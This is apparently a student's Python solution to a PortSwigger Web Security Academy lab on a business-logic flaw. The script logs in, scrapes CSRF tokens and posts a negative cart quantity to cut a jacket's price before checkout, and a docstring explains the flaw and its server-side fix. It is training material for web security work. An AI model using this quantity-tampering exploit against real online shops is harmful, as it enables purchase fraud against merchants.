"""
Tristan Gomez - CS 595
Spring 2021

The code below solves the PortSwigger level: High-level logic vulnerability

Level Description:
    This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

    You can log in to your own account using the following credentials: wiener:peter 

Vulnerability Description:
    The form for adding a product to the cart has a minimum value of 0 for the quantity of an item;
    however, the back-end does not properly validate this field. As an attacker, I can programatically
    send POST requests to add products to my cart where I can set the 'quantity' field to negative 
    amounts. I can exploit this bug by adding the jacket needed to solve the level to my cart. Then when
    it is in the cart, I can add negative amounts of another product which will take away from the price
    of the jacket in the cart. I need to add a suitable negative quantity of another product to lower 
    the price of the jacket to be under $100 but above $0. Then I can afford the jacket and successfully
    checkout.


Remediation:
    The easiest fix would be to properly validate the quantity field upon form submission for adding
    a product to the cart. Instead of trusting the front-end form, it should be the responsibility of
    the back-end to validate form fields. The back-end should detect negative quantites and not process
    the add to cart request.
"""

# We will need the "requests" library to send GET and POST requests.
# We will need "BeautifulSoup" to extract CSRF tokens used in form submissions.
import requests
from bs4 import BeautifulSoup

site = "ac581fc51e3006bb80c48dff00840077.web-security-academy.net"
s = requests.Session()
login_url = f"https://{site}/login"


"""
    Here I am sending a GET request for the /login page. I will
    use BeautifulSoup to then extract the CSRF token for the login form.
"""
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')


"""
    Now I will package the CSRF token and default credentials into
    a login_data object to be used for logging in.
"""
login_data = {
    'csrf' : csrf,
    'username' : 'wiener',
    'password' : 'peter'
}

resp = s.post(login_url, data=login_data)
print(f"Login response: {resp.status_code}")

"""
    After logging in, We will add the jacket to the cart
    using a POST request.
"""
cart_url = f"https://{site}/cart"
cart_data = {
    'productId': '1',
    'redir' : 'PRODUCT',
    'quantity' : '1',
}

resp = s.post(cart_url, data=cart_data)
print(f"Add to cart response (jacket): {resp.status_code}")


"""
    After successfully adding the jacket to the cart,
    we will perform the exploit. Note that the negative
    quantity will change between levels because the price of 
    the second product changes. You will have to adjust the quantity
    to where it will remove enough from the cost of the jacket
    to get its price under $100 but more than $0.
"""
cart_url = f"https://{site}/cart"
cart_data = {
    'productId': '2',
    'redir' : 'PRODUCT',
    'quantity' : '-26',
}

resp = s.post(cart_url, data=cart_data)
print(f"Add to cart response (exploit): {resp.status_code}")



cart_url = f"https://{site}/cart"

# get csrf token for checkout
resp = s.get(cart_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

# buy the jacket
checkout_data = { 'csrf' : csrf }
resp = s.post(f"{cart_url}/checkout", data=checkout_data)
print(f"checkout response: {resp.status_code}")
